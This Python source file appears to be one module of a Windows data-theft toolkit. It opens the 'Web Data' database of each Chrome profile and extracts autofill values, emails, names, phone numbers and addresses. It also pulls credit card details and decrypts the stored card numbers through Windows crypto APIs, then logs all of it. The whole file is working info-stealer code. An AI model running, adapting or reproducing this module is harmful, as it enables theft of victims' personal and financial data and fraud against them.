# coding: utf-8

try:
	import os
	import sqlite3
	import win32crypt
except ImportError:
	pass

from modules.windows.chrome.chrome_module import ChromeModule


class WindowsChromeSavedData(ChromeModule):
	def __init__(self):
		ChromeModule.__init__(
			self,
			name='WindowsChromeSavedData',
			version='0.1.0',
			file=__file__,
			dependencies=['os', 'sqlite3', 'win32crypt'],
		)

	def execute(self) -> bool:
		if not super().execute():
			return False

		for profile in self.get_profiles():
			download_path = profile + '/Web Data'
			if os.path.isfile(download_path):
				connection = sqlite3.connect(download_path)
				cursor = connection.cursor()

				self.cursor_get_and_log(cursor, 'name, value', 'autofill', spe='autofill.' + os.path.split(profile)[1])
				self.cursor_get_and_log(cursor, 'email', 'autofill_profile_emails', spe='autofill_profile_emails.' + os.path.split(profile)[1])
				self.cursor_get_and_log(cursor, 'first_name,middle_name,last_name,full_name', 'autofill_profile_names', spe='autofill_profile_names.' + os.path.split(profile)[1])
				self.cursor_get_and_log(cursor, 'number', 'autofill_profile_phones', spe='autofill.' + os.path.split(profile)[1])
				self.cursor_get_and_log(cursor, 'street_address,city,state,zipcode,country_code,origin,language_code', 'autofill_profiles', spe='autofill_profiles.' + os.path.split(profile)[1])
				self.cursor_get_and_log(cursor, 'name_on_card,expiration_month,expiration_year,card_number_encrypted,billing_address_id', 'credit_cards', decrypt_ids=[3], spe='credit_cards.' + os.path.split(profile)[1])

		return True
